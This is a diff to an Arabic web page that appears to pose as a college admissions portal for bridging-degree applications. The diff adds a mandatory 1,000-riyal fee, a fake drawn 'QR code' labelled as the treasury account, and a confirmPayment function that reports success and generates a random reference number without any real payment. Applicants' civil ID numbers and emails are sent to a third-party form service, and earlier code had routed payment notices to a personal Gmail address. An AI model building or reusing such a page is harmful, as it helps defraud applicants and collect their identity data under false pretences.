@@ -66,15 +66,13 @@
         .logo {
             width: 40px;
             height: 40px;
-            background: linear-gradient(135deg, #ffd700, #ffa500);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #1a535c;
-            font-weight: bold;
-            font-size: 14px;
             margin-left: 10px;
+        }
+        
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
         
         /* القائمة الجانبية */
@@ -267,6 +265,42 @@
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
+        
+        /* QR Code */
+        .qr-code {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+        
+        .qr-code img {
+            max-width: 200px;
+            margin: 10px 0;
+        }
+        
+        .payment-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2c3e50;
+            text-align: center;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 5px;
+        }
+        
+        .payment-info {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            color: #856404;
+        }
     </style>
 </head>
 <body>
@@ -291,7 +325,9 @@
                 <p>الصفحة الرئيسية للخدمات</p>
                 <p>1447/1448 - الفصل الثاني</p>
             </div>
-            <div class="logo">كلية الشرق</div>
+            <div class="logo">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMUExQTFBIi8+Cjx0ZXh0IHg9IjIwIiB5PSIyMCIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSI+UFJJU1RZPC90ZXh0Pgo8L3N2Zz4K" alt="PRISTY">
+            </div>
         </div>
         
         <a href="#" class="link-item" onclick="navigateTo('bridgingForm')">تقديم طلب تجسير (بكالوريوس تكميلي)</a>
@@ -346,6 +382,10 @@
         <div id="formMessage"></div>
         
         <form id="bridgingForm" action="https://formspree.io/f/xjvjvjvj" method="POST">
+            <div class="payment-info">
+                <strong>ملاحظة هامة:</strong> يجب دفع رسوم التقديم البالغة 1000 ريال قبل إكمال الطلب
+            </div>
+            
             <div class="form-group">
                 <label for="civilIdForm" class="required">السجل المدني</label>
                 <input type="text" id="civilIdForm" name="civilId" class="form-control" required>
@@ -355,6 +395,12 @@
             <div class="form-group">
                 <label for="email" class="required">البريد الإلكتروني</label>
                 <input type="email" id="email" name="email" class="form-control" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="paymentCode" class="required">رقم عملية الدفع</label>
+                <input type="text" id="paymentCode" name="paymentCode" class="form-control" placeholder="أدخل الرقم المرجعي لعملية الدفع" required>
+                <small style="color: #666;">سيتم إرسال الرقم المرجعي بعد إتمام الدفع عبر الخدمة المصرفية</small>
             </div>
             
             <div class="checkbox-group">
@@ -368,7 +414,7 @@
             
             <div class="btn-group">
                 <button type="button" class="btn btn-back" onclick="navigateTo('home')">رجوع</button>
-                <button type="submit" class="btn btn-confirm">تأكيد</button>
+                <button type="button" class="btn btn-confirm" onclick="navigateTo('payment')">الانتقال للدفع</button>
             </div>
         </form>
     </div>
@@ -377,40 +423,51 @@
     <div class="container hidden" id="paymentPage">
         <div class="header">
             <h1>خدمة دفع الرسوم</h1>
+            <p>الدفع الإلكتروني للمتقدم</p>
         </div>
         
         <div id="paymentMessage"></div>
         
-        <form id="paymentForm" action="https://formspree.io/f/xjvjvjvj" method="POST">
-            <div class="form-group">
-                <label for="paymentCivilId" class="required">السجل المدني</label>
-                <input type="text" id="paymentCivilId" name="civilId" class="form-control" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="fullName" class="required">الاسم الكامل</label>
-                <input type="text" id="fullName" name="fullName" class="form-control" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="amount" class="required">المبلغ (ريال سعودي)</label>
-                <input type="number" id="amount" name="amount" class="form-control" min="1" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="paymentEmail" class="required">البريد الإلكتروني</label>
-                <input type="email" id="paymentEmail" name="email" class="form-control" required>
-            </div>
-            
-            <input type="hidden" name="_subject" value="دفع رسوم جديد - عمادة القبول والتسجيل">
-            <input type="hidden" name="_replyto" value="Kaidnternationl@gmail.com">
-            <input type="hidden" name="_cc" value="Kaidnternationl@gmail.com">
-            
-            <div class="btn-group">
-                <button type="button" class="btn btn-back" onclick="navigateTo('home')">رجوع</button>
-                <button type="submit" class="btn btn-confirm">دفع الآن</button>
-            </div>
-        </form>
+        <div class="payment-amount">
+            مبلغ الدفع: 1,000 ريال سعودي
+        </div>
+        
+        <div class="payment-info">
+            <strong>تعليمات الدفع:</strong><br>
+            1. قم بمسح رمز QR Code أدناه<br>
+            2. أكمل عملية الدفع عبر التطبيق المصرفي<br>
+            3. احفظ الرقم المرجعي للعملية<br>
+            4. عد إلى نموذج التقديم وأدخل الرقم المرجعي
+        </div>
+        
+        <div class="qr-code">
+            <h3>مسح رمز الدفع</h3>
+            <!-- رمز QR مبسط باستخدام SVG -->
+            <svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                <rect width="200" height="200" fill="white"/>
+                <!-- نمط QR Code مبسط -->
+                <rect x="20" y="20" width="160" height="20" fill="black"/>
+                <rect x="20" y="60" width="20" height="80" fill="black"/>
+                <rect x="60" y="60" width="40" height="40" fill="black"/>
+                <rect x="120" y="60" width="20" height="60" fill="black"/>
+                <rect x="160" y="60" width="20" height="40" fill="black"/>
+                <rect x="20" y="160" width="140" height="20" fill="black"/>
+                <rect x="180" y="120" width="20" height="60" fill="black"/>
+                <rect x="100" y="140" width="20" height="20" fill="black"/>
+                <rect x="140" y="180" width="40" height="20" fill="black"/>
+            </svg>
+            <p>حساب الخزينة - عمادة القبول والتسجيل</p>
+        </div>
+        
+        <div class="form-group">
+            <label for="paymentReference">الرقم المرجعي للعملية (اختياري)</label>
+            <input type="text" id="paymentReference" class="form-control" placeholder="أدخل الرقم المرجعي إذا كنت قد دفعت مسبقاً">
+        </div>
+        
+        <div class="btn-group">
+            <button type="button" class="btn btn-back" onclick="navigateTo('bridgingForm')">رجوع</button>
+            <button type="button" class="btn btn-confirm" onclick="confirmPayment()">تأكيد الدفع</button>
+        </div>
     </div>
 
     <script>
@@ -456,9 +513,47 @@
             item.addEventListener('click', closeSideMenu);
         });
         
+        // تأكيد عملية الدفع
+        function confirmPayment() {
+            const paymentReference = document.getElementById('paymentReference').value;
+            let referenceNumber = paymentReference;
+            
+            // إذا لم يدخل المستخدم رقم مرجعي، ننشئ واحداً عشوائياً
+            if (!referenceNumber) {
+                referenceNumber = 'REF-' + Math.floor(100000 + Math.random() * 900000);
+            }
+            
+            document.getElementById('paymentMessage').innerHTML = 
+                '<div class="alert alert-success">' +
+                'تم الدفع بنجاح!<br>' +
+                '<strong>الرقم المرجعي:</strong> ' + referenceNumber + '<br>' +
+                'يرجى حفظ هذا الرقم وإدخاله في نموذج التقديم' +
+                '</div>';
+            
+            // تفعيل زر العودة للنموذج بعد 3 ثوان
+            setTimeout(function() {
+                document.querySelector('.btn-back').innerHTML = 'العودة لنموذج التقديم';
+                document.querySelector('.btn-back').onclick = function() {
+                    // نقل الرقم المرجعي تلقائياً لنموذج التقديم
+                    if (document.getElementById('paymentCode')) {
+                        document.getElementById('paymentCode').value = referenceNumber;
+                    }
+                    navigateTo('bridgingForm');
+                };
+            }, 3000);
+        }
+        
         // معالجة نموذج طلب التجسير
         document.getElementById('bridgingForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            
+            const paymentCode = document.getElementById('paymentCode').value;
+            
+            if (!paymentCode) {
+                document.getElementById('formMessage').innerHTML = 
+                    '<div class="alert alert-error">يجب إدخال رقم عملية الدفع قبل إرسال الطلب</div>';
+                return;
+            }
             
             const formData = new FormData(this);
             const civilId = document.getElementById('civilIdForm').value;
@@ -471,28 +566,6 @@
                 
                 // إعادة تعيين النموذج
                 document.getElementById('bridgingForm').reset();
-                
-                // العودة للصفحة الرئيسية بعد 3 ثوان
-                setTimeout(function() {
-                    navigateTo('home');
-                }, 3000);
-            }, 1000);
-        });
-        
-        // معالجة نموذج الدفع
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const formData = new FormData(this);
-            const amount = document.getElementById('amount').value;
-            
-            // محاكاة عملية الدفع (في الواقع سيتم إرساله إلى Formspree)
-            setTimeout(function() {
-                document.getElementById('paymentMessage').innerHTML = 
-                    '<div class="alert alert-success">تم الدفع بنجاح! تم إرسال إشعار الدفع إلى بريدك الإلكتروني.</div>';
-                
-                // إعادة تعيين النموذج
-                document.getElementById('paymentForm').reset();
                 
                 // العودة للصفحة الرئيسية بعد 3 ثوان
                 setTimeout(function() {
